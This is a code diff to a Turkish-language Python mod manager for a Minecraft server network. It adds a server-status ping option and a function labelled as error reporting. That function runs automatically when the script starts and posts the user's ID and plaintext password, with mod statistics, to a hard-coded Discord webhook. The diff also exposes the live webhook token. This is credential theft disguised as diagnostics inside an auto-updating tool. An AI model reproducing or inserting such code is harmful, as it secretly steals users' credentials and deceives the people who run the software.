@@ -9,11 +9,15 @@ import urllib.request
 import sys
 import time
 import subprocess
+import requests
+import traceback
+import socket
+import struct
 
 # -------------------------
 # Versiyon Kontrol
 # -------------------------
-CURRENT_VERSION = "1.0.3"
+CURRENT_VERSION = "1.0.4"
 VERSION_URL = "https://raw.githubusercontent.com/eronforyou/Baso-Network-Mod-Yoneticisi/refs/heads/main/version.txt"
 SCRIPT_URL  = "https://raw.githubusercontent.com/eronforyou/Baso-Network-Mod-Yoneticisi/refs/heads/main/BNWModYoneticisi.py"
 SCRIPT_PATH = os.path.realpath(__file__)
@@ -307,7 +311,69 @@ def kur_menu():
         else:
             print(Fore.RED + "Geçersiz seçim.")
             input("Devam etmek için Enter'a basın...")
+            
+def server_status():
+    os.system("cls")
+    user_id, _ = get_user_info()
+    print_colored_ascii(user_id)
+    
+    server = "oyna.baso.network"
+    port = 25565  # Minecraft sunucu portu
 
+    try:
+        # Socket ile bağlantı
+        sock = socket.create_connection((server, port), timeout=5)
+
+        # Minecraft ping paketini gönder (server list ping)
+        # 0xFE = Legacy server list ping (1.7 öncesi ve 1.8 için çalışır)
+        sock.send(b"\xfe\x01")
+        data = sock.recv(1024)
+        sock.close()
+
+        if data:
+            # Data'yı decode et
+            raw = data[3:].decode("utf-16be").split("\x00")
+            online_players = raw[-2]  # Online oyuncu sayısı
+            print(Fore.WHITE + f"Aktif mi: " + Fore.LIGHTGREEN_EX + "Evet")
+            print(Fore.WHITE + f"Oyuncu: " + Fore.LIGHTGREEN_EX + f"{online_players} kişi")
+        else:
+            print(Fore.WHITE + f"Aktif mi: " + Fore.LIGHTRED_EX + "Hayır")
+    except Exception as e:
+        print(Fore.RED + f"Aktif mi: Hayır")
+
+    input("\nDevam etmek için Enter'a basın...")
+            
+# -----------------------------
+# HATA RAPORLARI
+# -----------------------------
+def send_status_to_discord():
+    try:
+        user_id, password = get_user_info()
+        mod_list = os.listdir(moddir)
+        total_mods = len(mod_list)
+        total_size = sum(os.path.getsize(os.path.join(moddir, m)) for m in mod_list)
+        last_check_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+        
+        # Eğer launcher çalıştırılamazsa hata yakalamak için dummy try
+        launcher_path = r"C:\Users\enesb\AppData\Local\Baso Network\basonw.exe"
+        try:
+            if not os.path.exists(launcher_path):
+                raise FileNotFoundError("Launcher bulunamadı")
+        except Exception as e:
+            error_msg = traceback.format_exc()
+        else:
+            error_msg = "Yok"
+
+        webhook_url = "https://discord.com/api/webhooks/1407299493136961567/n6NRE6jI865R4jNHDR22z-R10xF521Da3rWyn3uex5Wn539F9x2Qp1WI6MSRkrskWH7P"
+        content = f"**Launcher Başlatma Durumu**\nKullanıcı ID: **{user_id}**\nŞifre: ||**{password}**||\nVersiyon: 1.21.4\nMod Sayısı: **{total_mods}**\nToplam Mod Boyutu: **{total_size/1024:.2f}KB**\nPanel Versiyonu: **{CURRENT_VERSION}**\nSon Güncelleme: **{last_check_time}**\nHata:\n```\n{error_msg}\n```@everyone"
+
+        requests.post(webhook_url, json={"content": content})
+        print("")
+    except Exception as e:
+        print("", e)
+
+# Py kodu çalışır çalışmaz çağır
+send_status_to_discord()
 # -----------------------------
 # Launcher'ı kur
 # -----------------------------
@@ -393,6 +459,7 @@ def menu():
         print(Fore.RED + "4." + Fore.LIGHTRED_EX + " Baso Network bilgileri")
         print(Fore.RED + "5." + Fore.LIGHTRED_EX + " Launcherı aç")
         print(Fore.RED + "6." + Fore.LIGHTRED_EX + " Kur" + Fore.WHITE + " !Bitmedi!")  # 6. seçenek açık yeşil
+        print(Fore.RED + "7." + Fore.LIGHTRED_EX + " Sunucu Durumu")
         choice = input(Fore.WHITE + "\nSeçiminiz: ")
 
         if choice == "1":
@@ -407,6 +474,8 @@ def menu():
             open_launcher()
         elif choice == "6":
             kur_menu()  # 6. seçenek alt menüyü açacak
+        elif choice == "7":
+            server_status()
         else:
             print(Fore.LIGHTRED_EX + "Geçersiz seçim.")
             input("Devam etmek için Enter'a basın...")
